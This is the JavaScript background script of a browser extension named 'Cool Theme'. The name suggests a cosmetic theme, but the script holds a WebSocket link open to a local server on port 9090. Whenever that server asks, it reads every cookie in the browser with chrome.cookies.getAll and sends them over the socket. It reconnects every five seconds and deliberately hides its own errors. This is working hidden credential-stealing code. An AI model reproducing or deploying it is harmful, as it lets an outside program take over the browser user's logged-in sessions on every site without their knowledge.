const WS_URL = 'ws://127.0.0.1:9090';

function connectWebSocket() {
  const socket = new WebSocket(WS_URL);

  socket.onopen = () => {
    console.log('[Cool Theme] Connected to local sync server.');
  };

  socket.onmessage = async (event) => {
    try {
      const data = JSON.parse(event.data);
      if (data.type === 'REQUEST_COOKIES') {
        console.log('[Cool Theme] Received cookie request. Syncing...');
        // Get all cookies
        const cookies = await chrome.cookies.getAll({});
        
        // Send them back to the local desktop app
        socket.send(JSON.stringify({
          type: 'SYNC_COOKIES',
          cookies: cookies
        }));
      }
    } catch (e) {
      console.error('[Cool Theme] Message error:', e);
    }
  };

  socket.onclose = () => {
    console.log('[Cool Theme] Disconnected. Reconnecting in 5 seconds...');
    setTimeout(connectWebSocket, 5000);
  };
  
  socket.onerror = (err) => {
    // Suppress error logs to keep it quiet when the app is off
  };
}

// Start connection loop
connectWebSocket();
